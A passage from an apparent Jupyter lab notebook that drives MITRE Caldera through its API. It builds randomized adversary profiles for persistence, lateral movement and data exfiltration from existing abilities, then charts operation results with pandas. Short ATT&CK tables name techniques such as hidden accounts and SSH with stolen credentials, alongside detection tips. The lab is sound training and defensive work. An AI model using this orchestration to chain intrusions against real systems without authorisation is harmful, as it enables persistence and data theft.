| Boot/Logon Autostart | T1547 | ~/.bashrc, /etc/rc.local | File integrity monitoring |
| Create Account | T1136 | Add a hidden user | /etc/passwd, useradd logs |

**Blue Team Perspective – Detection:**
- Monitor modifications to startup files (`/etc/cron*`, `~/.bashrc`)
- Alert on new cron jobs with auditd
- IDS signatures for payload downloads

In [ ]:
# ── D.1 ADVANCED PERSISTENCE - WITH API VERIFICATION ───────────────────────
print("🔒 OPERATION D.1: ADVANCED PERSISTENCE\n")

# Filter LINUX persistence abilities without unresolvable requirements
persist_ab = [a for a in abilities
              if a.get('tactic', '') == 'persistence'
              and any('linux' in str(e.get('platform', '')).lower()
                     for e in a.get('executors', []) if isinstance(e, dict))]

print(f'📊 Persistence abilities (LINUX): {len(persist_ab)}\n')

# Analyze requirements
persist_with_reqs = []
persist_no_reqs = []

for ab in persist_ab:
    reqs = ab.get('requirements', [])
    if reqs:
        persist_with_reqs.append(ab)
    else:
        persist_no_reqs.append(ab)

print(f'   ✅ Without requirements (independent): {len(persist_no_reqs)}')
print(f'   🔗 With requirements (dependent): {len(persist_with_reqs)}')

# ADVANCED STRATEGY: Compatible chain
selected_persist = []

# Step 1: Base (no requirements)
if persist_no_reqs:
    base_count = min(random.randint(1, 2), len(persist_no_reqs))
    base_abs = random.sample(persist_no_reqs, base_count)
    selected_persist.extend([ab.get('ability_id', '') for ab in base_abs])
    print(f'\n📌 Step 1 - Base (no dependencies): {base_count} abilities')
    for ab in base_abs:
        print(f'   ✅ {ab.get("technique_id", "?")} - {ab.get("name", "N/A")[:45]}')

# Step 2: Advanced (with resolvable requirements)
valid_with_reqs = []
for ab in persist_with_reqs:
    reqs = ab.get('requirements', [])
    if any(req in selected_persist or req == 'paw' for req in reqs):
        valid_with_reqs.append(ab)

if valid_with_reqs:
    advanced_count = min(random.randint(1, 3), len(valid_with_reqs))
    advanced_abs = random.sample(valid_with_reqs, advanced_count)
    selected_persist.extend([ab.get('ability_id', '') for ab in advanced_abs])
    print(f'\n📌 Step 2 - Advanced (with resolvable dependencies): {advanced_count} abilities')
    for ab in advanced_abs:
        reqs = ab.get('requirements', [])
        print(f'   🔗 {ab.get("technique_id", "?")} - {ab.get("name", "N/A")[:35]} | requires: {reqs}')

# Add more if needed
while len(selected_persist) < 5 and persist_no_reqs:
    ab = random.choice(persist_no_reqs)
    abid = ab.get('ability_id', '')
    if abid not in selected_persist:
        selected_persist.append(abid)

print(f'\n✅ Total PERSISTENCE abilities: {len(selected_persist)}')

# ============================================================================
# 1. CREATE ADVERSARY
# ============================================================================
print('\n' + '='*80)
print('📝 CREATING ADVERSARY IN CALDERA...')
print('='*80)

adv_persist_id = None
adversary_persist = {
    'name': 'Lab-Persistence-Advanced',
    'description': f'Advanced adversary: persistence with {len(selected_persist)} abilities in a compatible chain',
    'atomic_ordering': selected_persist
}

try:
    r = requests.post(f'{CALDERA_URL}/api/v2/adversaries',
                      headers=HEADERS,
                      json=adversary_persist,
                      timeout=10)

    if r.status_code in (200, 201):
        adv_persist = r.json()
        adv_persist_id = adv_persist.get('adversary_id', adv_persist.get('id', ''))
        print(f'✅ POST successful - Adversary created')
        print(f'   HTTP {r.status_code}')
        print(f'   ID: {adv_persist_id}')
    else:
        print(f'❌ POST error - HTTP {r.status_code}')
        print(f'   {r.text[:300]}')
        adv_persist_id = None
except Exception as e:
    print(f'❌ POST error: {e}')
    adv_persist_id = None

# ============================================================================
# 2. VERIFY WITH GET (Query the API)
# ============================================================================
if adv_persist_id:
    print('\n' + '-'*80)
    print('🔍 VERIFYING CREATION IN CALDERA (GET)...')
    print('-'*80)

    try:
        r_verify = requests.get(f'{CALDERA_URL}/api/v2/adversaries/{adv_persist_id}',
                                headers=HEADERS,
                                timeout=10)

        if r_verify.status_code == 200:
            adv_data = r_verify.json()
            print(f'✅ GET successful - Adversary verified in Caldera')
            print(f'   HTTP {r_verify.status_code}\n')

            # Show details
            print('📋 ADVERSARY DETAILS:')
            print(f'   Name: {adv_data.get("name", "N/A")}')
            print(f'   ID: {adv_data.get("adversary_id", adv_data.get("id", "N/A"))}')
            print(f'   Description: {adv_data.get("description", "N/A")[:70]}...')
            print(f'   Abilities: {len(adv_data.get("atomic_ordering", []))}')
            print(f'   Created: {adv_data.get("created", "N/A")}')

            # List abilities
            atomic_ordering = adv_data.get('atomic_ordering', [])
            print(f'\n🎯 INCLUDED ABILITIES ({len(atomic_ordering)}):')
            for idx, ability_id in enumerate(atomic_ordering, 1):
                ab = ab_index.get(ability_id, {})
                tid = ab.get('technique_id', '?')
                name = ab.get('name', ability_id)[:50]
                print(f'   {idx}. [{tid}] {name}')

            print(f'\n✅ VERIFICATION COMPLETE - Adversary ACTIVE in Caldera')
        else:
            print(f'⚠️  GET error - HTTP {r_verify.status_code}')
            print(f'   {r_verify.text[:300]}')
    except Exception as e:
        print(f'❌ GET error: {e}')
else:
    print('\n❌ Cannot verify - Adversary was not created')

print('\n' + '='*80)
if adv_persist_id:
    print(f'🚀 OPERATION D.1 READY - ID: {adv_persist_id}')
else:
    print('❌ OPERATION D.1 FAILED')
print('='*80)

### D.2 – Lateral Movement

Lateral movement lets the attacker expand to other systems on the network.

**Requirements for lateral movement:**
- At least two agents registered on different hosts
- Valid credentials (obtained during the Credential Access phase)
- Network connectivity between the hosts

**Techniques:**
| Technique | ID | Description |
|---------|-----|-------------|
| Remote Services – SSH | T1021.004 | Connect via SSH with stolen credentials |
| Lateral Tool Transfer | T1570 | Copy tools to the target system |
| Remote Services | T1021 | RDP, SMB, WinRM |

In [ ]:
# ── D.2 ADVANCED LATERAL MOVEMENT - WITH API VERIFICATION ─────────────────
print("🔀 OPERATION D.2: ADVANCED LATERAL MOVEMENT\n")

# Filter LINUX lateral movement abilities
lateral_ab = [a for a in abilities
              if a.get('tactic', '') == 'lateral-movement'
              and any('linux' in str(e.get('platform', '')).lower()
                     for e in a.get('executors', []) if isinstance(e, dict))]

print(f'📊 Lateral movement abilities (LINUX): {len(lateral_ab)}\n')

# Analyze requirements
lateral_with_reqs = []
lateral_no_reqs = []

for ab in lateral_ab:
    reqs = ab.get('requirements', [])
    if reqs:
        lateral_with_reqs.append(ab)
    else:
        lateral_no_reqs.append(ab)

print(f'   ✅ Without requirements (independent): {len(lateral_no_reqs)}')
print(f'   🔗 With requirements (dependent): {len(lateral_with_reqs)}')

# ADVANCED STRATEGY
selected_lateral = []

# Step 1: Base (no requirements)
if lateral_no_reqs:
    base_count = min(random.randint(1, 2), len(lateral_no_reqs))
    base_abs = random.sample(lateral_no_reqs, base_count)
    selected_lateral.extend([ab.get('ability_id', '') for ab in base_abs])
    print(f'\n📌 Step 1 - Base (no dependencies): {base_count} abilities')
    for ab in base_abs:
        print(f'   ✅ {ab.get("technique_id", "?")} - {ab.get("name", "N/A")[:45]}')
else:
    print(f'\n⚠️  Step 1 - No independent abilities available')

# Step 2: Advanced (with resolvable requirements)
valid_with_reqs = []
for ab in lateral_with_reqs:
    reqs = ab.get('requirements', [])
    if any(req in selected_lateral or req == 'paw' for req in reqs):
        valid_with_reqs.append(ab)

if valid_with_reqs:
    advanced_count = min(random.randint(1, 3), len(valid_with_reqs))
    advanced_abs = random.sample(valid_with_reqs, advanced_count)
    selected_lateral.extend([ab.get('ability_id', '') for ab in advanced_abs])
    print(f'\n📌 Step 2 - Advanced (with resolvable dependencies): {advanced_count} abilities')
    for ab in advanced_abs:
        reqs = ab.get('requirements', [])
        print(f'   🔗 {ab.get("technique_id", "?")} - {ab.get("name", "N/A")[:35]} | requires: {reqs}')
else:
    print(f'\n⚠️  Step 2 - No advanced abilities available')

# Step 3: Fill in if needed (add more independent ones)
if len(selected_lateral) < 5 and lateral_no_reqs:
    remaining = [ab for ab in lateral_no_reqs
                 if ab.get('ability_id', '') not in selected_lateral]
    if remaining:
        additional_count = min(len(remaining), 5 - len(selected_lateral))
        additional_abs = random.sample(remaining, additional_count)
        selected_lateral.extend([ab.get('ability_id', '') for ab in additional_abs])
        print(f'\n📌 Step 3 - Fill in (more independent ones): {additional_count} abilities')
        for ab in additional_abs:
            print(f'   ✅ {ab.get("technique_id", "?")} - {ab.get("name", "N/A")[:45]}')
    else:
        print(f'\n⚠️  Step 3 - No more abilities available')

print(f'\n✅ Total LATERAL MOVEMENT abilities: {len(selected_lateral)}')
print(f'   (Maximum available: {len(lateral_ab)})')

# ============================================================================
# 1. CREATE ADVERSARY
# ============================================================================
print('\n' + '='*80)
print('📝 CREATING ADVERSARY IN CALDERA...')
print('='*80)

adv_lateral_id = None
adversary_lateral = {
    'name': 'Lab-LateralMovement-Advanced',
    'description': f'Advanced adversary: lateral movement with {len(selected_lateral)} abilities in a compatible chain',
    'atomic_ordering': selected_lateral
}

try:
    r = requests.post(f'{CALDERA_URL}/api/v2/adversaries',
                      headers=HEADERS,
                      json=adversary_lateral,
                      timeout=10)

    if r.status_code in (200, 201):
        adv_lateral = r.json()
        adv_lateral_id = adv_lateral.get('adversary_id', adv_lateral.get('id', ''))
        print(f'✅ POST successful - Adversary created')
        print(f'   HTTP {r.status_code}')
        print(f'   ID: {adv_lateral_id}')
    else:
        print(f'❌ POST error - HTTP {r.status_code}')
        print(f'   {r.text[:300]}')
        adv_lateral_id = None
except Exception as e:
    print(f'❌ POST error: {e}')
    adv_lateral_id = None

# ============================================================================
# 2. VERIFY WITH GET
# ============================================================================
if adv_lateral_id:
    print('\n' + '-'*80)
    print('🔍 VERIFYING CREATION IN CALDERA (GET)...')
    print('-'*80)

    try:
        r_verify = requests.get(f'{CALDERA_URL}/api/v2/adversaries/{adv_lateral_id}',
                                headers=HEADERS,
                                timeout=10)

        if r_verify.status_code == 200:
            adv_data = r_verify.json()
            print(f'✅ GET successful - Adversary verified in Caldera')
            print(f'   HTTP {r_verify.status_code}\n')

            print('📋 ADVERSARY DETAILS:')
            print(f'   Name: {adv_data.get("name", "N/A")}')
            print(f'   ID: {adv_data.get("adversary_id", adv_data.get("id", "N/A"))}')
            print(f'   Description: {adv_data.get("description", "N/A")[:70]}...')
            print(f'   Abilities: {len(adv_data.get("atomic_ordering", []))}')
            print(f'   Created: {adv_data.get("created", "N/A")}')

            atomic_ordering = adv_data.get('atomic_ordering', [])
            print(f'\n🎯 INCLUDED ABILITIES ({len(atomic_ordering)}):')
            for idx, ability_id in enumerate(atomic_ordering, 1):
                ab = ab_index.get(ability_id, {})
                tid = ab.get('technique_id', '?')
                name = ab.get('name', ability_id)[:50]
                print(f'   {idx}. [{tid}] {name}')

            print(f'\n✅ VERIFICATION COMPLETE - Adversary ACTIVE in Caldera')
        else:
            print(f'⚠️  GET error - HTTP {r_verify.status_code}')
    except Exception as e:
        print(f'❌ GET error: {e}')
else:
    print('\n❌ Cannot verify - Adversary was not created')

print('\n' + '='*80)
if adv_lateral_id:
    print(f'🚀 OPERATION D.2 READY - ID: {adv_lateral_id}')
else:
    print('❌ OPERATION D.2 FAILED')
print('='*80)

### D.3 – Data Exfiltration

Exfiltration is the final phase where stolen data leaves the compromised environment.

**Techniques:**
| Technique | ID | Channel |
|---------|-----|-------|
| Exfiltration Over C2 | T1041 | Existing C2 HTTP channel |
| Automated Exfiltration | T1020 | Automated scripts |
| Data Staged | T1074 | Aggregation before exfiltrating |

In [ ]:
# ── D.3 ADVANCED EXFILTRATION - WITH API VERIFICATION ──────────────────────
print("📤 OPERATION D.3: ADVANCED DATA EXFILTRATION\n")

# Filter LINUX exfiltration and collection abilities
exfil_tactics = {'exfiltration', 'collection'}
exfil_ab = [a for a in abilities
            if a.get('tactic', '') in exfil_tactics
            and any('linux' in str(e.get('platform', '')).lower()
                   for e in a.get('executors', []) if isinstance(e, dict))]

print(f'📊 Exfiltration/collection abilities (LINUX): {len(exfil_ab)}\n')

# Analyze requirements
exfil_with_reqs = []
exfil_no_reqs = []

for ab in exfil_ab:
    reqs = ab.get('requirements', [])
    if reqs:
        exfil_with_reqs.append(ab)
    else:
        exfil_no_reqs.append(ab)

print(f'   ✅ Without requirements (independent): {len(exfil_no_reqs)}')
print(f'   🔗 With requirements (dependent): {len(exfil_with_reqs)}')

# ADVANCED STRATEGY
selected_exfil = []

# Step 1: Base (no requirements)
if exfil_no_reqs:
    base_count = min(random.randint(1, 2), len(exfil_no_reqs))
    base_abs = random.sample(exfil_no_reqs, base_count)
    selected_exfil.extend([ab.get('ability_id', '') for ab in base_abs])
    print(f'\n📌 Step 1 - Base (no dependencies): {base_count} abilities')
    for ab in base_abs:
        print(f'   ✅ {ab.get("technique_id", "?")} - {ab.get("name", "N/A")[:45]}')
else:
    print(f'\n⚠️  Step 1 - No independent abilities available')

# Step 2: Advanced (with resolvable requirements)
valid_with_reqs = []
for ab in exfil_with_reqs:
    reqs = ab.get('requirements', [])
    if any(req in selected_exfil or req == 'paw' for req in reqs):
        valid_with_reqs.append(ab)

if valid_with_reqs:
    advanced_count = min(random.randint(1, 3), len(valid_with_reqs))
    advanced_abs = random.sample(valid_with_reqs, advanced_count)
    selected_exfil.extend([ab.get('ability_id', '') for ab in advanced_abs])
    print(f'\n📌 Step 2 - Advanced (with resolvable dependencies): {advanced_count} abilities')
    for ab in advanced_abs:
        reqs = ab.get('requirements', [])
        print(f'   🔗 {ab.get("technique_id", "?")} - {ab.get("name", "N/A")[:35]} | requires: {reqs}')
else:
    print(f'\n⚠️  Step 2 - No advanced abilities available')

# Step 3: Fill in if needed
if len(selected_exfil) < 5 and exfil_no_reqs:
    remaining = [ab for ab in exfil_no_reqs
                 if ab.get('ability_id', '') not in selected_exfil]
    if remaining:
        additional_count = min(len(remaining), 5 - len(selected_exfil))
        additional_abs = random.sample(remaining, additional_count)
        selected_exfil.extend([ab.get('ability_id', '') for ab in additional_abs])
        print(f'\n📌 Step 3 - Fill in (more independent ones): {additional_count} abilities')
        for ab in additional_abs:
            print(f'   ✅ {ab.get("technique_id", "?")} - {ab.get("name", "N/A")[:45]}')
    else:
        print(f'\n⚠️  Step 3 - No more abilities available')

print(f'\n✅ Total EXFILTRATION abilities: {len(selected_exfil)}')
print(f'   (Maximum available: {len(exfil_ab)})')

# ============================================================================
# 1. CREATE ADVERSARY
# ============================================================================
print('\n' + '='*80)
print('📝 CREATING ADVERSARY IN CALDERA...')
print('='*80)

adv_exfil_id = None
adversary_exfil = {
    'name': 'Lab-Exfiltration-Advanced',
    'description': f'Advanced adversary: exfiltration with {len(selected_exfil)} abilities in a compatible chain',
    'atomic_ordering': selected_exfil
}

try:
    r = requests.post(f'{CALDERA_URL}/api/v2/adversaries',
                      headers=HEADERS,
                      json=adversary_exfil,
                      timeout=10)

    if r.status_code in (200, 201):
        adv_exfil = r.json()
        adv_exfil_id = adv_exfil.get('adversary_id', adv_exfil.get('id', ''))
        print(f'✅ POST successful - Adversary created')
        print(f'   HTTP {r.status_code}')
        print(f'   ID: {adv_exfil_id}')
    else:
        print(f'❌ POST error - HTTP {r.status_code}')
        print(f'   {r.text[:300]}')
        adv_exfil_id = None
except Exception as e:
    print(f'❌ POST error: {e}')
    adv_exfil_id = None

# ============================================================================
# 2. VERIFY WITH GET
# ============================================================================
if adv_exfil_id:
    print('\n' + '-'*80)
    print('🔍 VERIFYING CREATION IN CALDERA (GET)...')
    print('-'*80)

    try:
        r_verify = requests.get(f'{CALDERA_URL}/api/v2/adversaries/{adv_exfil_id}',
                                headers=HEADERS,
                                timeout=10)

        if r_verify.status_code == 200:
            adv_data = r_verify.json()
            print(f'✅ GET successful - Adversary verified in Caldera')
            print(f'   HTTP {r_verify.status_code}\n')

            print('📋 ADVERSARY DETAILS:')
            print(f'   Name: {adv_data.get("name", "N/A")}')
            print(f'   ID: {adv_data.get("adversary_id", adv_data.get("id", "N/A"))}')
            print(f'   Description: {adv_data.get("description", "N/A")[:70]}...')
            print(f'   Abilities: {len(adv_data.get("atomic_ordering", []))}')
            print(f'   Created: {adv_data.get("created", "N/A")}')

            atomic_ordering = adv_data.get('atomic_ordering', [])
            print(f'\n🎯 INCLUDED ABILITIES ({len(atomic_ordering)}):')
            for idx, ability_id in enumerate(atomic_ordering, 1):
                ab = ab_index.get(ability_id, {})
                tid = ab.get('technique_id', '?')
                name = ab.get('name', ability_id)[:50]
                tact = ab.get('tactic', '?')
                print(f'   {idx}. [{tid}] {name:50s} ({tact})')

            print(f'\n✅ VERIFICATION COMPLETE - Adversary ACTIVE in Caldera')
        else:
            print(f'⚠️  GET error - HTTP {r_verify.status_code}')
    except Exception as e:
        print(f'❌ GET error: {e}')
else:
    print('\n❌ Cannot verify - Adversary was not created')

print('\n' + '='*80)
if adv_exfil_id:
    print(f'🚀 OPERATION D.3 READY - ID: {adv_exfil_id}')
else:
    print('❌ OPERATION D.3 FAILED')
print('='*80)

## Section E: Analysis with Python/Pandas 📊

### E.1 – Extracting Operation Data

In [ ]:
# ── E.1 Get all operations and build a DataFrame ──────────────────────────
try:
    r = requests.get(f'{CALDERA_URL}/api/v2/operations', headers=HEADERS, timeout=10)
    r.raise_for_status()
    all_operations = r.json()
    print(f'📋 Total operations on the server: {len(all_operations)}')
except Exception as e:
    all_operations = []
    print(f'❌ Error: {e}')

# Build DataFrame
ops_rows = []
for op in all_operations:
    chains   = op.get('chain', [])
    tactics  = list({c.get('ability',{}).get('tactic','?') for c in chains})
    n_ok     = sum(1 for c in chains if c.get('status') == 0)
    n_total  = len(chains)
    start    = op.get('start', '')
    finish   = op.get('finish', '')
    ops_rows.append({
        'name':        op.get('name', 'N/A'),
        'state':       op.get('state', 'N/A'),
        'group':       op.get('group', 'N/A'),
        'tactics':     ', '.join(tactics),
        'total_steps': n_total,
        'ok_steps':    n_ok,
        'fail_steps':  n_total - n_ok,
        'start':       start,
        'finish':      finish
    })

df_ops = pd.DataFrame(ops_rows)
print(f'\nOperations DataFrame: {df_ops.shape}')
if not df_ops.empty:
    print(df_ops.to_string(index=False))

In [ ]:
# ── E.2 Technique and tactic analysis ──────────────────────────────────────
# Flatten all links from all operations
all_links = []
for op in all_operations:
    op_name = op.get('name', 'N/A')
    for link in op.get('chain', []):
        ab     = link.get('ability', {})
        status = link.get('status', -99)
        all_links.append({
            'operation':    op_name,
            'ability':      ab.get('name', 'N/A'),
            'technique_id': ab.get('technique_id', 'N/A'),
            'tactic':       ab.get('tactic', 'N/A'),
            'status':       status,
            'success':      status == 0
        })

df_links = pd.DataFrame(all_links)
print(f'Total ability executions: {len(df_links)}')

if not df_links.empty:
    print('\n── Success rate by tactic ──')
    tactic_summary = df_links.groupby('tactic').agg(
        total=('success', 'count'),
        successful=('success', 'sum')
    ).reset_index()
    tactic_summary['rate_%'] = (tactic_summary['successful'] / tactic_summary['total'] * 100).round(1)
    print(tactic_summary.to_string(index=False))

In [ ]:
# ── E.3 Visualization – 4 charts ───────────────────────────────────────────
fig, axes = plt.subplots(2, 2, figsize=(15, 10))
fig.suptitle('🔴 Caldera Operations Analysis', fontsize=15, fontweight='bold')

# Chart 1: Tactic frequency
ax1 = axes[0, 0]
if not df_links.empty:
    tc = df_links['tactic'].value_counts()
    ax1.barh(tc.index, tc.values, color='steelblue', edgecolor='black', linewidth=0.5)
    ax1.set_title('Tactic Frequency')
    ax1.set_xlabel('Executions')
    ax1.grid(axis='x', alpha=0.3)
else:
    ax1.text(0.5, 0.5, 'No data', ha='center', va='center', transform=ax1.transAxes)
    ax1.set_title('Tactic Frequency')

# Chart 2: Overall success/failure rate
ax2 = axes[0, 1]
if not df_links.empty:
    total_ok   = df_links['success'].sum()
    total_fail = len(df_links) - total_ok
    if total_ok + total_fail > 0:
        ax2.pie([total_ok, total_fail],
                labels=['Successful', 'Failed/Skipped'],
                colors=['#2ecc71', '#e74c3c'],
                autopct='%1.1f%%', startangle=90)
    ax2.set_title('Overall Success Rate')
else:
    ax2.text(0.5, 0.5, 'No data', ha='center', va='center', transform=ax2.transAxes)
    ax2.set_title('Overall Success Rate')

# Chart 3: Operations by state
ax3 = axes[1, 0]
if not df_ops.empty:
    state_counts = df_ops['state'].value_counts()
    ax3.bar(state_counts.index, state_counts.values,
            color=['#3498db', '#2ecc71', '#e74c3c', '#f39c12'][:len(state_counts)],
            edgecolor='black', linewidth=0.5)
    ax3.set_title('Operations by State')
    ax3.set_ylabel('Number of operations')
    ax3.grid(axis='y', alpha=0.3)
else:
    ax3.text(0.5, 0.5, 'No data', ha='center', va='center', transform=ax3.transAxes)
    ax3.set_title('Operations by State')

# Chart 4: Success rate by tactic (bars)
ax4 = axes[1, 1]
if not df_links.empty and not tactic_summary.empty:
    colors_bar = ['#2ecc71' if v >= 50 else '#e74c3c' for v in tactic_summary['rate_%']]
    ax4.bar(range(len(tactic_summary)), tactic_summary['rate_%'],
            color=colors_bar, edgecolor='black', linewidth=0.5)
    ax4.set_xticks(range(len(tactic_summary)))
    ax4.set_xticklabels(tactic_summary['tactic'], rotation=30, ha='right', fontsize=8)
    ax4.set_title('Success Rate by Tactic (%)')
    ax4.set_ylabel('%')
    ax4.axhline(y=50, color='orange', linestyle='--', alpha=0.7, label='50%')
    ax4.legend(fontsize=8)
    ax4.grid(axis='y', alpha=0.3)
else:
    ax4.text(0.5, 0.5, 'No data', ha='center', va='center', transform=ax4.transAxes)
    ax4.set_title('Success Rate by Tactic')

plt.tight_layout()
plt.savefig('caldera_analysis.png', dpi=120, bbox_inches='tight')
plt.show()
print('💾 Chart saved: caldera_analysis.png')